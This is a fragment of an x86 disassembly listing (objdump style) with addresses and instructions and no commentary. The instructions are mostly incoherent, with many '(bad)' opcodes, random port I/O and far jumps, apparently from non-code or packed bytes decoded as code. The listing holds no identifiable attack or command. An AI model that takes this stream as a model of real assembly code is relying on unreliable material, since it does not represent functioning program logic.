  409f03:	xchg   DWORD PTR ds:0x80aee420,esp
  409f09:	xor    DWORD PTR [ecx+edi*1+0x73ec2d62],edx
  409f10:	out    dx,al
  409f11:	ret    0x411c
  409f14:	xor    al,0x9d
  409f16:	outs   dx,BYTE PTR ds:[esi]
  409f17:	inc    ebp
  409f18:	inc    eax
  409f19:	sub    BYTE PTR [ebx+0x6a437f72],dh
  409f1f:	sbb    dl,BYTE PTR [eax-0x49]
  409f22:	add    eax,0x6bf8e6f9
  409f27:	repnz in al,0x89
  409f2a:	es aaa 
  409f2c:	cmc    
  409f2d:	fnsave [eax-0x53]
  409f30:	jae    0x409ebf
  409f32:	jbe    0x409efa
  409f34:	dec    ebx
  409f35:	cmp    BYTE PTR [edx],ch
  409f37:	jmp    0x409ef8
  409f39:	lods   eax,DWORD PTR ds:[esi]
  409f3a:	ror    DWORD PTR [ebx],1
  409f3c:	inc    ecx
  409f3d:	mov    ch,0x7c
  409f3f:	xchg   esp,eax
  409f40:	sbb    ch,BYTE PTR [ebx-0x64]
  409f43:	cmp    BYTE PTR [edx],bh
  409f45:	fldcw  WORD PTR [eax*2-0x6179c468]
  409f4c:	jmp    0xfdf22009
  409f51:	and    DWORD PTR [esp+esi*1-0x4071dfd6],ebp
  409f58:	or     DWORD PTR [edi+ebp*2],edx
  409f5b:	push   eax
  409f5c:	pop    ebx
  409f5d:	push   cs
  409f5e:	fsub   st(5),st
  409f60:	xor    eax,0xd22cf496
  409f65:	cmp    ecx,DWORD PTR [eax-0x69]
  409f68:	mov    eax,0xff3d0429
  409f6d:	cdq    
  409f6e:	pop    eax
  409f6f:	and    al,0xef
  409f71:	retf   
  409f72:	repnz mov al,0xb7
  409f75:	push   edi
  409f76:	outs   dx,DWORD PTR ds:[esi]
  409f77:	in     eax,dx
  409f78:	repnz ins DWORD PTR es:[edi],dx
  409f7a:	mov    dh,0x2c
  409f7c:	fnstsw WORD PTR [ebx]
  409f7e:	add    eax,0xa3617211
  409f83:	inc    edx
  409f84:	xchg   ecx,eax
  409f85:	arpl   WORD PTR [ebp-0x4],di
  409f88:	hlt    
  409f89:	repz mov ebx,0xee50c3f8
  409f8f:	mov    ebx,cs
  409f91:	pop    ss
  409f92:	sub    DWORD PTR [edx-0x17],edi
  409f95:	jecxz  0x409f86
  409f97:	clc    
  409f98:	fnsave [edx-0x540e9a1e]
  409f9e:	loop   0x409f7e
  409fa0:	call   0x6300ea18
  409fa5:	pop    edx
  409fa6:	pop    esi
  409fa7:	mov    ecx,0x6ff763e
  409fac:	xchg   BYTE PTR [bp+0x75],ch
  409fb0:	out    0xf0,al
  409fb2:	xchg   ch,ah
  409fb4:	mov    al,0x1b
  409fb6:	outs   dx,BYTE PTR ds:[esi]
  409fb7:	xchg   edx,eax
  409fb8:	in     eax,0x48
  409fba:	jle    0x40a008
  409fbc:	imul   BYTE PTR [ebp-0x2]
  409fbf:	add    DWORD PTR [edi-0x7e],edx
  409fc2:	outs   dx,BYTE PTR ds:[esi]
  409fc3:	ret    
  409fc4:	cld    
  409fc5:	(bad)  
  409fc6:	jecxz  0x409f94
  409fc8:	clc    
  409fc9:	or     bl,BYTE PTR [edx+ecx*2-0x37913a6b]
  409fd0:	(bad)  
  409fd1:	hlt    
  409fd2:	aaa    
  409fd3:	and    BYTE PTR ds:0x463922a4,0xb5
  409fda:	xchg   edx,eax
  409fdb:	adc    DWORD PTR ds:[edx+0x750b13f0],esp
  409fe2:	fndisi(8087 only) 
  409fe4:	cmc    
  409fe5:	xchg   DWORD PTR [eax],edx
  409fe7:	or     DWORD PTR [edi+0x7238e4df],ebx
  409fed:	adc    eax,0x654253bc
  409ff2:	test   BYTE PTR [ebp+0x51],ch
  409ff5:	pop    ss
  409ff6:	push   ds
  409ff7:	iret   
  409ff8:	cmc    
  409ff9:	fs inc esi
  409ffb:	jge    0x409ff6
  409ffd:	(bad)  
  409fff:	loopne 0x40a03b
  40a001:	cmp    BYTE PTR [edx],dh
  40a003:	and    eax,0x2024a604
  40a008:	cmp    eax,0x75a36e3e
  40a00d:	mov    DWORD PTR [eax-0x19],esi
  40a010:	(bad)  
  40a011:	push   edx
  40a012:	(bad)  
  40a013:	and    eax,0xf9e43a4e
  40a018:	stos   BYTE PTR es:[edi],al
  40a019:	adc    al,0x30
  40a01b:	jmp    0x409fad
  40a01d:	inc    edi
  40a01e:	xchg   DWORD PTR [edx-0xb],ebp
  40a021:	(bad)  
  40a022:	add    al,0x57
  40a024:	xlat   BYTE PTR ds:[ebx]
  40a025:	mov    esi,0x38143e7d
  40a02a:	dec    ecx
  40a02b:	daa    
  40a02c:	jmp    0x6ebd:0xbc67dc2c
  40a033:	rcl    DWORD PTR [ebx-0x6f671f20],cl
  40a039:	pop    ss
  40a03a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a03b:	cmp    BYTE PTR [esi-0xd],cl
  40a03e:	pushf  
  40a03f:	ficomp WORD PTR [eax+esi*4+0x5df5025d]
  40a046:	ffree  st(7)
  40a048:	aad    0x11
  40a04a:	pop    es
  40a04b:	mov    edx,0x73f6387c
  40a050:	das    
  40a051:	jle    0x40a024
  40a053:	ins    BYTE PTR es:[edi],dx
  40a054:	xor    ebp,DWORD PTR [ecx]
  40a056:	lods   eax,DWORD PTR ds:[esi]
  40a057:	fisttp WORD PTR [eax-0x42ff8845]
  40a05d:	xor    eax,0xbe1f9970
  40a063:	in     eax,0x2b
  40a065:	xor    DWORD PTR [edx+0x760bd92b],eax
  40a06b:	and    eax,0xae6efbcf
  40a070:	adc    BYTE PTR ss:[ebp-0x437c4732],dh
  40a077:	in     al,0x8d
  40a079:	push   0x1534af6f
  40a07e:	sub    BYTE PTR [eax+esi*2+0x1d],bl
  40a082:	outs   dx,BYTE PTR ds:[esi]
  40a083:	add    eax,0xdcdcece2
  40a088:	shl    BYTE PTR [ebp+0x54],cl
  40a08b:	cmp    al,0x2e
  40a08d:	sbb    DWORD PTR [ebp-0x889ca3c],ebp
  40a093:	fwait
  40a094:	lahf   
  40a095:	jmp    0x5fd34002
  40a09a:	loope  0x40a0e0
  40a09c:	imul   edi,DWORD PTR [eax-0x1],0xc
  40a0a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0a1:	cmp    eax,DWORD PTR [ebp+esi*1+0x1f9e8077]
  40a0a8:	cmp    ch,BYTE PTR [edi+ebp*2]
  40a0ab:	ja     0x40a0a4
  40a0ad:	(bad)  
  40a0ae:	jbe    0x40a0ac
  40a0b0:	cdq    
  40a0b1:	sub    BYTE PTR [ecx+edi*1],ch
  40a0b4:	cwde   
  40a0b5:	adc    al,0xf4
  40a0b7:	data16 xor BYTE PTR [edi+ecx*2+0x3b],ch
  40a0bc:	cmc    
  40a0bd:	pop    edx
  40a0be:	pop    ss
  40a0bf:	dec    ebp
  40a0c0:	inc    ebx
  40a0c1:	test   ecx,ebx
  40a0c3:	lods   eax,DWORD PTR ds:[esi]
  40a0c4:	dec    eax
  40a0c5:	stos   DWORD PTR es:[edi],eax
  40a0c6:	cmc    
  40a0c7:	cmp    eax,0xcd5d6e4a
  40a0cc:	mov    dl,0x3b
  40a0ce:	push   esi
  40a0cf:	or     al,0x9
  40a0d1:	loopne 0x40a0a4
  40a0d3:	mov    dh,0xf5
  40a0d5:	lods   eax,DWORD PTR ds:[esi]
  40a0d6:	faddp  st(0),st
  40a0d8:	fiadd  WORD PTR [eax]
  40a0da:	mov    esi,0xfd098aed
  40a0df:	retf   0x6a66
  40a0e2:	outs   dx,DWORD PTR ds:[esi]
  40a0e3:	mov    ebx,0xc93cb5e7
  40a0e8:	xor    bl,bh
  40a0ea:	pop    ds
  40a0eb:	mov    ecx,0x92a9412c
  40a0f0:	int3   
  40a0f1:	out    0x58,al
  40a0f3:	cmp    DWORD PTR [eax],esi
  40a0f5:	cwde   
  40a0f6:	(bad)  
  40a0f7:	sub    bh,BYTE PTR [edx-0xac8b6c6]
  40a0fd:	(bad)  
  40a0fe:	or     ch,cl
  40a100:	or     bl,bl
  40a102:	nop
  40a103:	fdivr  DWORD PTR [eax+edi*1-0x5c]
  40a107:	and    al,0x64
  40a109:	jl     0x40a12a
  40a10b:	mov    esi,ebx
  40a10d:	inc    edi
  40a10e:	mov    bl,0x6c
  40a110:	sbb    eax,0xe55d8a38
  40a115:	mov    eax,0xa7e2bb27
  40a11a:	or     DWORD PTR [esp+eax*1],edi
  40a11d:	or     ch,BYTE PTR ss:[ebx+0x18]
  40a121:	loope  0x40a151
  40a123:	mov    bl,0xfa
  40a125:	out    0xe2,eax
  40a127:	inc    esi
  40a128:	call   0x95191273
  40a12d:	push   edx
  40a12e:	dec    eax
  40a12f:	mov    dh,0x6a
  40a131:	sub    eax,0xe0368e8f
  40a136:	popa   
  40a137:	add    ch,dh
  40a139:	xchg   ebx,eax
  40a13a:	jmp    0x13d2:0x58641ff4
  40a141:	cli    
  40a142:	adc    esi,eax
  40a144:	xor    eax,0x5aaae64e
  40a149:	add    DWORD PTR [ebp+0x38],esi
  40a14c:	cmp    BYTE PTR [edi-0x7d],ah
  40a14f:	addr16 add cl,dl
  40a152:	sub    eax,0xd23af52b
  40a157:	daa    
  40a158:	mov    edx,0xcc5b655f
  40a15d:	cmp    esi,ebx
  40a15f:	xor    DWORD PTR [eax+eiz*4+0x786d47d1],edx
  40a166:	outs   dx,DWORD PTR ds:[esi]
  40a167:	push   edx
  40a168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a169:	inc    ecx
  40a16a:	xor    eax,0x6da2f811
  40a16f:	cmp    DWORD PTR [edi-0x24],ebx
  40a172:	pop    ds
  40a173:	mov    ds:0x6ac71d42,eax
  40a178:	cmc    
  40a179:	push   esp
  40a17a:	push   esp
  40a17b:	(bad)  
  40a17c:	xchg   ecx,eax
  40a17d:	push   es
  40a17e:	jl     0x40a152
  40a180:	jbe    0x40a196
  40a182:	stos   BYTE PTR es:[edi],al
  40a183:	mov    edi,DWORD PTR [ebp+0x31]
  40a186:	test   al,0xf4
  40a188:	and    ebx,DWORD PTR [ebx-0x2c]
  40a18b:	mov    eax,0x1e067bf3
  40a190:	cmc    
  40a191:	out    dx,al
  40a192:	adc    al,0x3a
  40a194:	push   ebx
  40a195:	fsub   QWORD PTR [edx+0x11]
  40a198:	inc    esp
  40a199:	xor    DWORD PTR [edx-0x6c45e6a5],edx
  40a19f:	mov    BYTE PTR [ebp+0x30b446fd],cl
  40a1a5:	inc    esi
  40a1a6:	xchg   ecx,eax
  40a1a7:	mov    eax,0x8479a5c
  40a1ac:	fstp   DWORD PTR ss:[eax*1+0x63fde7f9]
  40a1b4:	mov    eax,0x352bdd18
  40a1b9:	and    cl,BYTE PTR [edx+0x11]
  40a1bc:	xchg   edi,eax
  40a1bd:	xchg   ebp,eax
  40a1be:	push   es
  40a1bf:	add    ebp,esi
  40a1c1:	shr    ah,0x60
  40a1c4:	loope  0x40a1f5
  40a1c6:	xlat   BYTE PTR ds:[ebx]
  40a1c7:	sbb    ecx,ebp
  40a1c9:	jecxz  0x40a1d7
  40a1cb:	(bad)  
  40a1cc:	in     al,dx
  40a1cd:	call   0xf88b85f0
  40a1d2:	mov    edx,0x75c9ca05
  40a1d7:	mov    esi,0x23a27946
  40a1dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1dd:	add    BYTE PTR [edx-0x5c502ed],0x64
  40a1e4:	jo     0x40a166
  40a1e6:	xor    DWORD PTR [si+0x3b4b],edx
  40a1eb:	shl    cl,1
  40a1ed:	xchg   edi,eax
  40a1ee:	outs   dx,BYTE PTR ds:[esi]
  40a1ef:	das    
  40a1f0:	loopne 0x40a178
  40a1f2:	frstor [ebx]
  40a1f4:	mov    ah,0xc0
  40a1f6:	push   DWORD PTR [ebx]
  40a1f8:	pop    edx
  40a1f9:	xlat   BYTE PTR ds:[ebx]
  40a1fa:	mov    bl,0x7c
  40a1fc:	fisttp WORD PTR [ebx]
  40a1fe:	pop    ebx
  40a1ff:	pop    esi
  40a200:	xor    dl,dh
  40a202:	test   BYTE PTR [esi-0x419159a7],al
  40a208:	add    al,0xea
  40a20a:	addps  xmm4,XMMWORD PTR [edx]
  40a20d:	mov    BYTE PTR [ebx-0x27c7ae78],ch
  40a213:	dec    ebx
  40a214:	ror    ah,1
  40a216:	imul   ebx,DWORD PTR [bx+0x50],0x6f
  40a21b:	aas    
  40a21c:	pop    ds
  40a21d:	push   es
  40a21e:	or     eax,0x50f38cda
  40a223:	loope  0x40a1ff
  40a225:	pusha  
  40a226:	outs   dx,DWORD PTR ds:[esi]
  40a227:	adc    al,0xad
  40a229:	loop   0x40a244
  40a22b:	xor    ah,BYTE PTR [ebx]
  40a22d:	or     BYTE PTR [esi+0x16],ch
  40a230:	fdivr  st,st(4)
  40a232:	xor    al,0x14
  40a234:	sbb    al,0x3c
  40a236:	call   0x5ce55773
  40a23b:	nop
  40a23c:	test   eax,0x33c1daf0
  40a241:	jecxz  0x40a256
  40a243:	cmp    al,0xde
  40a245:	cmp    ebp,0xe18346ec
  40a24b:	cmc    
  40a24c:	fld    st(4)
  40a24e:	pop    eax
  40a24f:	sbb    eax,0xf85e7bbc
  40a254:	cmc    
  40a255:	mov    edi,0xd2564c10
  40a25a:	int3   
  40a25b:	push   0x6dd966d5
  40a260:	cmc    
  40a261:	ror    bl,1
  40a263:	xchg   ecx,eax
  40a264:	mov    ds:0x88782664,al
  40a269:	stos   BYTE PTR es:[edi],al
  40a26a:	push   0xd11c0438
  40a26f:	mov    dl,0x93
  40a271:	and    eax,0x6ef5a41c
  40a276:	jmp    0x6b717e20
  40a27b:	mov    bh,0x41
  40a27d:	cmp    BYTE PTR ds:0xf2907b06,ah
  40a283:	xor    eax,0x86e892a
  40a288:	sbb    al,0xa0
  40a28a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a28b:	pop    ebp
  40a28c:	xchg   ecx,eax
  40a28d:	sub    bh,BYTE PTR [ecx+0x38]
  40a290:	sub    DWORD PTR [ebx+edi*1+0x68b53ac5],0x41b6f5a1
  40a29b:	jle    0x40a2cd
  40a29d:	mov    dl,0xd3
  40a29f:	pop    ebp
  40a2a0:	jle    0x40a2da
  40a2a2:	xchg   ecx,eax
  40a2a3:	icebp  
  40a2a4:	nop
  40a2a5:	(bad)  
  40a2a6:	lahf   
  40a2a7:	dec    BYTE PTR [edi+ecx*8+0x642f2c6]
  40a2ae:	adc    bl,BYTE PTR [esi+0x7871c663]
  40a2b4:	repnz daa 
  40a2b6:	dec    edi
  40a2b7:	inc    edi
  40a2b8:	lods   al,BYTE PTR ds:[esi]
  40a2b9:	cmp    ebp,DWORD PTR [edx]
  40a2bb:	std    
  40a2bc:	bswap  esi
  40a2be:	adc    eax,0xac7fec86
  40a2c3:	ret    0xb861
  40a2c6:	sbb    al,0x4a
  40a2c8:	shl    DWORD PTR [edi],0xad
  40a2cb:	jmp    0x40a27b
  40a2cd:	cmp    esp,DWORD PTR ds:0xd08aba60
  40a2d3:	pusha  
  40a2d4:	int3   
  40a2d5:	pop    ss
  40a2d6:	test   BYTE PTR [esi],bl
  40a2d8:	inc    eax
  40a2d9:	iret   
  40a2da:	push   0xffffffb4
  40a2dc:	add    ah,BYTE PTR [eax+0x6355ea2e]
  40a2e2:	sub    BYTE PTR [ecx],bh
  40a2e4:	pushf  
  40a2e5:	cld    
  40a2e6:	mov    ds:0xdbbad4e7,al
  40a2eb:	jo     0x40a2e2
  40a2ed:	lods   al,BYTE PTR ds:[esi]
  40a2ee:	mov    al,0x62
  40a2f0:	xchg   BYTE PTR [edx],ah
  40a2f2:	mov    edx,0xd53b8f4e
  40a2f7:	sbb    ch,al
  40a2f9:	or     BYTE PTR [edi-0xb],bl
  40a2fc:	jae    0x40a356
  40a2fe:	outs   dx,DWORD PTR ds:[esi]
  40a2ff:	call   0xd7a8bd7a
  40a304:	loop   0x40a34b
  40a306:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a307:	cmp    ecx,eax
  40a309:	xchg   ebx,eax
  40a30a:	pusha  
  40a30b:	dec    eax
  40a30c:	dec    edi
  40a30d:	dec    ecx
  40a30e:	xchg   BYTE PTR [ecx+0x68],cl
  40a311:	pop    esp
  40a312:	je     0x40a341
  40a314:	in     al,0xdc
  40a316:	lock inc edi
  40a318:	pop    eax
  40a319:	clc    
  40a31a:	push   ebx
  40a31b:	test   BYTE PTR ds:0x123e8f53,0x7e
  40a322:	test   esp,ebp
  40a324:	test   DWORD PTR [esi+0x4f],ebx
  40a327:	out    dx,al
  40a328:	test   eax,0x19196e8b
  40a32d:	aas    
  40a32e:	scas   eax,DWORD PTR es:[edi]
  40a32f:	or     al,0xf8
  40a331:	stos   DWORD PTR es:[edi],eax
  40a332:	(bad)  
  40a333:	cmp    BYTE PTR [ebp+0x723b76ba],dl
  40a339:	mul    DWORD PTR gs:[edi-0xb]
  40a33d:	xor    edi,DWORD PTR [ebx]
  40a33f:	mov    DWORD PTR [esi+0x697fa1dd],eax
  40a345:	cmp    ah,cl
  40a347:	loop   0x40a369
  40a349:	popf   
  40a34a:	in     al,dx
  40a34b:	adc    ah,bh
  40a34d:	out    dx,al
  40a34e:	push   0xc3dd1752
  40a353:	(bad)  
  40a354:	ins    DWORD PTR es:[edi],dx
  40a355:	js     0x40a324
  40a357:	call   0xd496dc4a
  40a35c:	sbb    eax,0x6ba79f08
  40a361:	mov    bh,0x8a
  40a363:	out    dx,al
  40a364:	ret    
  40a365:	xor    ch,BYTE PTR [esi+0x70]
  40a368:	inc    esp
  40a369:	mov    ch,0x42
  40a36b:	daa    
  40a36c:	retf   0xf517
  40a36f:	pop    edi
  40a370:	lods   eax,DWORD PTR ds:[esi]
  40a371:	cmp    esp,esp
  40a373:	adc    BYTE PTR [edi],bh
  40a375:	push   es
  40a376:	push   ecx
  40a377:	stos   DWORD PTR es:[edi],eax
  40a378:	adc    eax,ecx
  40a37a:	pop    eax
  40a37b:	stc    
  40a37c:	xor    eax,0xc239c621
  40a381:	cli    
  40a382:	fdivr  DWORD PTR [eax]
  40a384:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a385:	addr16 popf 
  40a387:	mov    ds:0xf2bdc287,al
  40a38c:	cmc    
  40a38d:	lea    ecx,[ebx+0x167e2383]
  40a393:	jmp    0xcc6e1b9d
  40a398:	test   al,0xe6
  40a39a:	add    cl,BYTE PTR [eax+eiz*8-0x20a6d2af]
  40a3a1:	mov    ebx,0xaea9ae8e
  40a3a6:	dec    ebp
  40a3a7:	cmp    DWORD PTR [edx+0xe686729],esp
  40a3ad:	outs   dx,DWORD PTR ds:[esi]
  40a3ae:	add    al,0x5d
  40a3b0:	adc    esi,DWORD PTR [eax-0x76]
  40a3b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3b4:	xchg   edx,eax
  40a3b5:	std    
  40a3b6:	cmp    bh,BYTE PTR cs:[ebp+0x3a]
  40a3ba:	je     0x40a387
  40a3bc:	push   es
  40a3bd:	push   0x8da238e0
  40a3c2:	stos   DWORD PTR es:[edi],eax
  40a3c3:	jnp    0x40a3e1
  40a3c5:	sub    DWORD PTR [ebp+0x13],ebx
  40a3c8:	cmc    
  40a3c9:	and    esi,DWORD PTR [esi]
  40a3cb:	push   edi
  40a3cc:	pop    ebx
  40a3cd:	jne    0x40a3c6
  40a3cf:	jmp    0xd158df60
  40a3d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3d5:	mov    al,0x4c
  40a3d7:	adc    DWORD PTR ds:0xe8a36f74,ebp
  40a3dd:	pop    ds
  40a3de:	cmp    al,0xfa
  40a3e0:	push   0x752ead98
  40a3e5:	mov    ah,cl
  40a3e7:	cmp    ch,ah
  40a3e9:	xchg   ecx,eax
  40a3ea:	pop    esp
  40a3eb:	retf   0x45cb
  40a3ee:	push   0x21885bf8
  40a3f3:	out    dx,eax
  40a3f4:	shr    ah,cl
  40a3f6:	inc    edx
  40a3f7:	mov    ah,al
  40a3f9:	cmp    BYTE PTR [edx+0x28efee9e],cl
  40a3ff:	pop    eax
  40a400:	add    DWORD PTR [esi+0x381cabac],0xe33c2f4a
  40a40a:	cs mov ah,0x46
  40a40d:	call   0x5241e654
  40a412:	jecxz  0x40a454
  40a414:	in     al,dx
  40a415:	add    ebx,ecx
  40a417:	outs   dx,DWORD PTR ds:[esi]
  40a418:	mov    bh,0x0
  40a41a:	into   
  40a41b:	push   cs
  40a41c:	test   eax,0x272febb0
  40a421:	mov    dl,0xea
  40a423:	cmp    BYTE PTR [ebx+0x5e7fdd2c],ah
  40a429:	mov    al,0x6b
  40a42b:	add    eax,0x2d982242
  40a430:	mov    ch,0x4b
  40a432:	xor    BYTE PTR [eax],dh
  40a434:	xchg   BYTE PTR [ecx],cl
  40a436:	jno    0x40a41e
  40a438:	jp     0x40a49c
  40a43a:	out    dx,eax
  40a43b:	cmc    
  40a43c:	rol    DWORD PTR es:[ebx+0x13],1
  40a440:	jecxz  0x40a40e
  40a442:	mov    DWORD PTR [edx-0x7eeca402],esi
  40a448:	add    eax,0xdd3e4eae
  40a44d:	xor    al,0xca
  40a44f:	pop    ebx
  40a450:	test   al,0x24
  40a452:	pcmpgtw mm0,QWORD PTR [ecx]
  40a455:	outs   dx,DWORD PTR ds:[esi]
  40a456:	jle    0x40a408
  40a458:	pop    ss
  40a459:	in     al,0x4
  40a45b:	add    eax,0xad63d2f5
  40a460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a461:	in     eax,dx
  40a462:	cmp    DWORD PTR es:[edi-0x69],eax
  40a466:	push   ebx
  40a467:	les    esp,FWORD PTR [edi-0x5f]
  40a46a:	push   edi
  40a46b:	repz std 
  40a46d:	ins    DWORD PTR es:[edi],dx
  40a46e:	push   0xc140d566
  40a473:	dec    ebp
  40a474:	mov    dh,0x53
  40a476:	cmp    al,0xfe
  40a478:	push   ebp
  40a479:	shl    DWORD PTR [ebp+0x39],0xbb
  40a47d:	cmp    eax,0xc676f578
  40a482:	and    edx,ebx
  40a484:	cmc    
  40a485:	mov    WORD PTR [eax-0xee02b76],?
  40a48b:	cmp    eax,0xb20038e9
  40a490:	xchg   esi,eax
  40a491:	aam    0xd7
  40a493:	push   eax
  40a494:	jbe    0xa54e0d08
  40a49a:	leave  
  40a49b:	or     eax,0x3910d1e3
  40a4a0:	call   0xbbc77465
  40a4a5:	enter  0x8c0d,0xf5
  40a4a9:	rcl    DWORD PTR gs:[edx+0x4d],1
  40a4ad:	mov    bh,0x8e
  40a4af:	push   ss
  40a4b0:	mov    DWORD PTR [ebx],edi
  40a4b2:	mov    eax,ds:0xcbe66b40
  40a4b7:	test   BYTE PTR [eax],0x2d
  40a4ba:	jbe    0x40a4df
  40a4bc:	mov    BYTE PTR [ebx+0x70],0xbd
  40a4c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4c1:	pop    ecx
  40a4c2:	jbe    0x40a48b
  40a4c4:	repz sbb esi,ebp
  40a4c7:	inc    ecx
  40a4c8:	sbb    edi,DWORD PTR [ebx]
  40a4ca:	fstp   DWORD PTR [ebx-0x5]
  40a4cd:	cld    
  40a4ce:	inc    edx
  40a4cf:	inc    ecx
  40a4d0:	je     0x40a54b
  40a4d2:	outs   dx,DWORD PTR ds:[esi]
  40a4d3:	mul    BYTE PTR [ecx+0x1c470919]
  40a4d9:	sar    dh,1
  40a4db:	js     0x40a4bc
  40a4dd:	inc    eax
  40a4de:	jecxz  0x40a510
  40a4e0:	sub    al,0x99
  40a4e2:	mov    ds:0xea014f9a,al
  40a4e7:	and    ch,dh
  40a4e9:	add    ch,BYTE PTR [ecx-0x37]
  40a4ec:	int    0xd7
  40a4ee:	jns    0x40a527
  40a4f0:	in     eax,0x46
  40a4f2:	test   DWORD PTR [esi],ebx
  40a4f4:	jne    0x40a4d4
  40a4f6:	mov    ah,0xa6
  40a4f8:	jbe    0x40a484
  40a4fa:	outs   dx,BYTE PTR ds:[esi]
  40a4fb:	mov    ds:0xd1fbd7f,eax
  40a500:	lea    eax,[ebx+ebx*4]
  40a503:	pop    es
  40a504:	mov    ecx,0xbe946868
  40a509:	gs mov esi,0xbb406f83
  40a50f:	ds cmc 
  40a511:	sbb    BYTE PTR [edi+0x34a516b0],0xef
  40a518:	mov    cl,0x3e
  40a51a:	push   esi
  40a51b:	sbb    bl,BYTE PTR [edx+0x5b78fc4a]
  40a521:	cs jmp 0x40a570
  40a524:	div    cl
  40a526:	add    eax,0xa60aab94
  40a52b:	sub    cl,bl
  40a52d:	lea    edi,es:[eax]
  40a530:	add    esp,DWORD PTR [ebx]
  40a532:	sub    ebx,DWORD PTR [ecx+esi*8-0x13f2c62d]
  40a539:	mov    esi,0x7b16736c
  40a53e:	iret   
  40a53f:	repnz mov ebx,ebp
  40a542:	aad    0xe8
  40a544:	stc    
  40a545:	dec    esp
  40a546:	push   ss
  40a547:	cmp    DWORD PTR [ecx+0x3b],edi
  40a54a:	adc    BYTE PTR [edx-0x4f],ah
  40a54d:	push   0xffffffd2
  40a54f:	mov    bh,0xf6
  40a551:	dec    edx
  40a552:	sbb    eax,0x94e23da4
  40a557:	retf   0x6ec5
  40a55a:	sub    al,BYTE PTR ds:0xfdeed418
  40a560:	inc    esi
  40a561:	and    ch,BYTE PTR [edx+ebx*2+0x167530c5]
  40a568:	xchg   esi,eax
  40a569:	hlt    
  40a56a:	std    
  40a56b:	les    edx,FWORD PTR [ebp-0x60]
  40a56e:	sbb    BYTE PTR [esi],ah
  40a570:	push   ebp
  40a571:	cmp    BYTE PTR [edi-0x61],dl
  40a574:	dec    eax
  40a575:	repz (bad) 
  40a577:	(bad)  
  40a578:	add    eax,0x74476e95
  40a57d:	mov    BYTE PTR [ebp-0x470119a6],ch
  40a583:	(bad)  
  40a584:	repz cmp edi,ebp
  40a587:	into   
  40a588:	pop    ebp
  40a589:	cmp    BYTE PTR [esi+0x6f20a825],0x9e
  40a590:	xor    edx,DWORD PTR [edx-0x31]
  40a593:	xchg   ebp,eax
  40a594:	or     eax,0xdc395379
  40a599:	jp     0x40a617
  40a59b:	and    ebx,DWORD PTR [eax]
  40a59d:	sbb    DWORD PTR [esp+ebp*8],eax
  40a5a0:	in     al,0xf2
  40a5a2:	int3   
  40a5a3:	call   0x3dd4:0x724ed83e
  40a5aa:	(bad)  [ebx]
  40a5ac:	or     eax,ebp
  40a5ae:	pop    ecx
  40a5af:	inc    esp
  40a5b0:	pusha  
  40a5b1:	adc    DWORD PTR [eax-0x47],edx
  40a5b4:	mov    bh,0x50
  40a5b6:	sar    DWORD PTR [eax-0x20],0x9f
  40a5ba:	cmp    al,0xef
  40a5bc:	xor    edi,DWORD PTR [eax]
  40a5be:	fist   WORD PTR [edi]
  40a5c0:	(bad)  
  40a5c2:	mov    ch,0xc5
  40a5c4:	aad    0x3b
  40a5c6:	jmp    0xd165db13
  40a5cb:	hlt    
  40a5cc:	inc    esi
  40a5cd:	and    ebp,DWORD PTR [eax+0xb]
  40a5d0:	std    
  40a5d1:	shr    DWORD PTR [edx],cl
  40a5d3:	jmp    0x1f15:0x55dfd138
  40a5da:	and    BYTE PTR [edx],0x48
  40a5dd:	pop    ebp
  40a5de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5df:	cmp    BYTE PTR [edx+0x477ee9a6],dl
  40a5e5:	icebp  
  40a5e6:	outs   dx,BYTE PTR ds:[esi]
  40a5e7:	jnp    0x40a642
  40a5e9:	mov    WORD PTR [edx],fs
  40a5eb:	fisubr DWORD PTR [ebx+esi*8+0x2edd393d]
  40a5f2:	pop    edx
  40a5f3:	jl     0x40a5bb
  40a5f5:	jp     0x40a65c
  40a5f7:	(bad)  
  40a5f8:	cmc    
  40a5f9:	nop
  40a5fa:	leave  
  40a5fb:	push   ecx
  40a5fc:	mov    dl,0x87
  40a5fe:	pop    edx
  40a5ff:	das    
  40a600:	js     0x40a63a
  40a602:	xor    esp,DWORD PTR [edx]
  40a604:	cmp    ch,0xd7
  40a607:	xchg   ebx,eax
  40a608:	jge    0x40a5ae
  40a60a:	outs   dx,BYTE PTR ds:[esi]
  40a60b:	in     eax,dx
  40a60c:	mov    eax,0xd16f450a
  40a611:	adc    al,0x2c
  40a613:	cmp    al,0xbc
  40a615:	mov    eax,0x9eb67bfd
  40a61a:	sbb    DWORD PTR [ebx*8+0x7a451702],eax
  40a621:	jbe    0x40a6a1
  40a623:	cs out 0x20,ax
  40a627:	mov    ecx,0x84384384
  40a62c:	add    DWORD PTR [esi],esi
  40a62e:	mov    eax,0xae1a4640
  40a633:	push   ebp
  40a634:	retf   
  40a635:	out    dx,eax
  40a636:	cmp    ah,BYTE PTR [ebx+0x4edb8a9d]
  40a63c:	cmc    
  40a63d:	mov    ebp,0x4336eea5
  40a642:	cmc    
  40a643:	fild   DWORD PTR [edi-0x5ec6cea9]
  40a649:	daa    
  40a64a:	lods   eax,DWORD PTR ds:[esi]
  40a64b:	shl    esi,0xb8
  40a64e:	js     0x40a696
  40a650:	not    dh
  40a652:	imul   edi,ebp,0xffffffe0
  40a655:	outs   dx,BYTE PTR ds:[esi]
  40a656:	add    DWORD PTR [eax+0x38b37cc1],0x2891bf47
  40a660:	xchg   ebp,eax
  40a661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a662:	cli    
  40a663:	inc    ebx
  40a664:	cmc    
  40a665:	push   eax
  40a666:	push   ecx
  40a667:	sub    BYTE PTR [eax+eiz*4+0x59],dh
  40a66b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a66c:	sar    DWORD PTR [ebx],1
  40a66e:	(bad)  
  40a670:	add    eax,DWORD PTR [edx-0x24]
  40a673:	inc    eax
